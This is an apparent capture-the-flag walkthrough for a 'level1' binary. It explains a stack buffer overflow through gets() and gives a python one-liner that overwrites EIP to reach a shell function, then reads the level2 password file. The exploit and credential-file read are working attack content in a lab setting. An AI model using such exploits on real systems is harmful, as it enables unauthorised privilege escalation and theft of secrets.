# Walkthrough

## Step 1: Disassembling the executable

see source.c

The executable calls the gets function on a buffer of 0x40. According to the man, this (deprecated) function reads a line from stdin. There is no check of the size of the input read, so we can easily do a buffer overflow.

To exploit this executable, we use the buffer overflow to rewrite the eip register in order to jump to a function that launches a shell as level2.

```
(python -c "print('A'* 0x40 + 'B' * 12 + '\x44\x84\x04\x08')"; echo "cat /home/user/level2/.pass") | ./level1
```
